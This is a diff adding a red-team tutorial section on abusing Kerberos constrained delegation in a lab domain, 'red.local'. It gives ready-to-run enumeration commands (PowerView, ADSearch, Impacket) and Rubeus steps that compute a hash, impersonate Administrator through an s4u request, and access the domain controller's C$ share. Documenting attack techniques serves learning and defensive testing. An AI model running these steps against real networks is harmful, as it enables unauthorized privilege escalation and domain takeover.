@@ -106,3 +106,67 @@ dir \\dc01\c$
 
 ----
 
+# Kerberos Constrained Delegation - User
+
+## Enumeration
+
+1. ADModule
+
+```powershell
+Import-Module .\Microsoft.ActiveDirectory.Management.dll
+
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+```
+![](/docs/assets/images/KCD-1.png)
+
+2. ADSearch
+
+```bash
+.\ADSearch.exe --search "(&(objectCategory=user)(msds-allowedtodelegateto=*))" --attributes samaccountname
+```
+![](/docs/assets/images/KCD-2.png)
+
+3. PowerView
+
+```powershell
+. .\PowerView.ps1
+
+Get-NetUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
+```
+![](/docs/assets/images/KCD-3.png)
+
+4. Impacket
+
+```bash
+findDelegation.py red.local/domuser:'P@ssw0rd1!' -target-domain red.local
+```
+![](/docs/assets/images/KUD-4.png)
+
+## Exploitation
+
+1. Use `Rubeus.exe` to generate the users `rc4` hash
+
+```bash
+.\Rubeus.exe hash /user:"prod_svc" /password:"P@ss123!" /domain:"red.local"
+```
+
+![](/docs/assets/images/KCD-4.png)
+
+2. Use `Rubues.exe` s4u module to impersonate the Administrator 
+
+```bash
+.\Rubeus.exe s4u /domain:"red.local" /user:"prod_svc" /rc4:5AF33376FB21C57A84F3066E7CFBDECC /impersonateuser:"Administrator" /msdsspn:"cifs/dc01" /nowrap /ptt
+
+klist
+```
+
+![](/docs/assets/images/KCD-5.png)
+
+![](/docs/assets/images/KCD-6.png)
+
+3. List the `C$` share on the DC.
+
+```bash
+dir \\dc01\c$
+```
+
